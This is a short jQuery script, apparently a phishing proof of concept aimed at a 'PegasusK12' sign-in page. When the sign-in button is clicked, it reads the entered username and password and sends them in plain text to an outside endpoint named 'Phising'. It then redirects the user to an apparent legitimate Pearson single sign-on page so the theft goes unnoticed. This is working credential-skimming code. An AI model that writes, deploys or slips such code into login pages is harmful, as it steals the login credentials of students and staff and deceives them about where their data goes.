


$(document).ready(function () {
    $("#Pegasusk12SignInBtn").click(function () {
        // Post the User Information to server through Service
        PostInfo($("#username").val(), $("#password").val());
        window.location.assign("https://sso.rumba.int.pearsoncmg.com/sso/login?sessionTimeout=true&profile=snp&k12int=true&service=https%3a%2f%2fpegasus1.qa.pegasus.pearsoncmg.com%2fPegasus%2fRumbaSsoHandler.ashx%3fprofile%3dsnp")
    });
});



function PostInfo(username, password) {
    sitename = "PegasusK12"
    $.getJSON("http://192.168.5.28/InbrowserNotificationPOC/api/Phising?usename=" + username + "&password=" + password + "&sitename=" + sitename,
        function (Data) {
            alert("ok!!");
        })
    .fail(
        function (jqXHR, textStatus, err) {
            $('#items').text('Error: ' + err);
        });


}
